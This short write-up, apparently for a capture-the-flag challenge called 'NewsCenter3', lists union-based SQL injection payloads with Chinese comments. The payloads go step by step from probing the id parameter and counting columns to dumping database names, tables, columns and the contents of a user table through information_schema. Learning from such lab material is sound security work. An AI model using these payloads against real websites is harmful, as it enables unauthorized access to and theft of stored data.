
# NewsCenter3

* sql注入
``` 
?id=1 and 1=1  
?id=1 order by 10  
?id=1 union select 1,2,3  
// 获取数据库名，当前用户盲注
?id=1 union select 1,database(),user()
// 获取数据库名
?id=1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.SCHEMATA
// 获取数据库表  
?id=1 union select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES where TABLE_SCHEMA = 'mydbs'
// 根据获取的数据库表获取表名  
?id=1 union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME = 'sae_user_sqli3'
// 获取表中的内容（也可以union 获取表中数据）  
?id=1 union select 1,group_concat(content),3 from sae_user_sqli3

```
